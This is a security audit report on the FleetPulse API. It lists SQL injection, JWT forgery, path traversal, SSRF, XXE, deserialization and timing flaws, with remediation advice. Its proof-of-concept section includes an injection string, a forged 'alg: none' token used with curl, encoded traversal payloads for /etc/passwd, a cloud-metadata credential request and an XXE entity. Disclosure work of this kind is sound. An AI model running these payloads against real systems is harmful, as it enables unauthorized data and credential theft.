# Security Audit Report: FleetPulse API Assessment

## Executive Summary

**Audit Period**: February 1-5, 2024
**Auditor**: CyberShield Security Consulting
**Scope**: FleetPulse API v3.2.1 (Java 21 / Spring Boot)
**Classification**: CONFIDENTIAL

---

## Critical Findings

### FINDING-001: SQL Injection in Vehicle Search

**Severity**: CRITICAL
**CVSS Score**: 9.8
**CWE**: CWE-89 (Improper Neutralization of Special Elements in SQL Command)

**Description**:
The vehicle search endpoint constructs SQL queries using string concatenation rather than parameterized queries.

**Proof of Concept**:
```http
GET /api/v1/vehicles/search?q=truck'%20OR%201=1--%20 HTTP/1.1
Authorization: Bearer <token>
```

**Response**:
```json
{
  "vehicles": [
    {"id": "v-001", "type": "sedan", "owner": "competitor_company"},
    {"id": "v-002", "type": "truck", "owner": "another_client"},
    ... (all vehicles in database returned)
  ]
}
```

**Impact**: Complete database access bypass. Attacker can read all fleet data across all customers.

---

### FINDING-002: JWT Algorithm Confusion Attack

**Severity**: CRITICAL
**CVSS Score**: 9.1
**CWE**: CWE-347 (Improper Verification of Cryptographic Signature)

**Description**:
The JWT validation logic accepts tokens with `"alg": "none"`, completely bypassing signature verification.

**Proof of Concept**:
```bash
# Forged JWT with no signature
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJTVVBFUl9BRE1JTiIsImV4cCI6OTk5OTk5OTk5OX0."

curl -H "Authorization: Bearer $TOKEN" \
     https://api.fleetpulse.io/api/v1/admin/users
```

**Result**: Full admin access without valid credentials.

---

### FINDING-003: Path Traversal in Report Download

**Severity**: CRITICAL
**CVSS Score**: 8.6
**CWE**: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

**Description**:
The report download endpoint does not properly validate file paths, allowing access to arbitrary files on the server.

**Proof of Concept**:
```http
GET /api/v1/reports/download?file=../../../etc/passwd HTTP/1.1
Authorization: Bearer <token>
```

**Bypass Vectors Tested**:
- `../../../etc/passwd` - Basic traversal (blocked)
- `..%2f..%2f..%2fetc/passwd` - URL encoded (BYPASSED)
- `....//....//....//etc/passwd` - Double dot (BYPASSED)
- `..%252f..%252f..%252fetc/passwd` - Double encoded (BYPASSED)

---

### FINDING-004: Server-Side Request Forgery (SSRF)

**Severity**: HIGH
**CVSS Score**: 8.1
**CWE**: CWE-918 (Server-Side Request Forgery)

**Description**:
The webhook configuration endpoint allows users to specify arbitrary URLs, which the server then fetches without validation.

**Proof of Concept**:
```http
POST /api/v1/webhooks HTTP/1.1
Content-Type: application/json
Authorization: Bearer <token>

{
  "name": "my-webhook",
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

**Result**: Attacker can access AWS instance metadata, potentially obtaining IAM credentials.

---

## High Findings

### FINDING-005: Unsafe Deserialization

**Severity**: HIGH
**CVSS Score**: 7.5
**CWE**: CWE-502 (Deserialization of Untrusted Data)

**Description**:
The application uses `ObjectInputStream` to deserialize user-controlled data without type validation.

**Evidence**:
```
POST /api/v1/import/vehicles HTTP/1.1
Content-Type: application/octet-stream

[Serialized Java object payload]
```

**Log Output**:
```
java.lang.ClassCastException: cannot cast org.apache.commons.collections4.functors.InvokerTransformer
to com.fleetpulse.vehicles.model.Vehicle
```

The error message reveals that arbitrary classes are being deserialized before the cast check.

---

### FINDING-006: XXE Vulnerability in Report Import

**Severity**: HIGH
**CVSS Score**: 7.2
**CWE**: CWE-611 (Improper Restriction of XML External Entity Reference)

**Description**:
The XML report import functionality processes external entities, allowing file disclosure and SSRF.

**Proof of Concept**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE report [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<report>
  <title>&xxe;</title>
</report>
```

**Result**: Contents of `/etc/passwd` included in error response.

---

### FINDING-007: Timing Attack on Password Verification

**Severity**: MEDIUM
**CVSS Score**: 5.9
**CWE**: CWE-208 (Observable Timing Discrepancy)

**Description**:
Password and API key comparisons use `String.equals()` which returns early on first mismatched character.

**Test Results**:
```
Password "aaaaaaaa" - avg response: 0.823ms
Password "correctp" - avg response: 1.247ms  (7 correct chars)
Password "correctx" - avg response: 1.312ms  (7 correct chars)
Password "correct!" - avg response: 1.456ms  (8 correct chars = actual password)
```

**Impact**: Attacker can guess passwords character-by-character by measuring response times.

---

### FINDING-008: API Key Timing Attack

**Severity**: MEDIUM
**CVSS Score**: 5.3
**CWE**: CWE-208 (Observable Timing Discrepancy)

**Description**:
Same timing vulnerability exists for API key validation in the shared library.

---

## Low Findings

### FINDING-009: Verbose Error Messages

**Severity**: LOW
**Description**: Stack traces exposed in API error responses reveal internal paths, library versions, and code structure.

```json
{
  "error": "Internal Server Error",
  "trace": "java.lang.NullPointerException\n\tat com.fleetpulse.billing.service.InvoiceService.calculate(InvoiceService.java:234)\n\tat ..."
}
```

---

## Remediation Priority

| Priority | Finding | Action Required |
|----------|---------|-----------------|
| P0 | FINDING-001 | Use JPA parameterized queries or CriteriaBuilder |
| P0 | FINDING-002 | Reject JWT `alg: none` explicitly |
| P0 | FINDING-003 | Canonicalize paths and validate against allowlist |
| P0 | FINDING-004 | Validate webhook URLs against allowlist |
| P1 | FINDING-005 | Remove ObjectInputStream usage, use Jackson with type restrictions |
| P1 | FINDING-006 | Disable external entities in XML parser |
| P1 | FINDING-007 | Use MessageDigest.isEqual() for constant-time comparison |
| P1 | FINDING-008 | Use MessageDigest.isEqual() for API key comparison |
| P2 | FINDING-009 | Disable stack traces in production |

---

## Files to Review

Based on findings, focus remediation on:
- `gateway/src/main/java/com/fleetpulse/gateway/repository/VehicleSearchRepository.java`
- `gateway/src/main/java/com/fleetpulse/gateway/controller/ReportController.java`
- `gateway/src/main/java/com/fleetpulse/gateway/controller/WebhookController.java`
- `auth/src/main/java/com/fleetpulse/auth/security/JwtValidator.java`
- `auth/src/main/java/com/fleetpulse/auth/service/PasswordService.java`
- `auth/src/main/java/com/fleetpulse/auth/service/ImportService.java`
- `shared/src/main/java/com/fleetpulse/shared/security/ApiKeyValidator.java`
- `shared/src/main/java/com/fleetpulse/shared/xml/ReportParser.java`

---

**Report Prepared By**: Marcus Webb, Senior Penetration Tester
**Reviewed By**: Dr. Anita Patel, Chief Security Officer
**Date**: February 6, 2024

---

## Remediation Verification

CyberShield will perform verification testing within the 30-day remediation window at no additional cost. Please notify us when fixes are ready for retest.
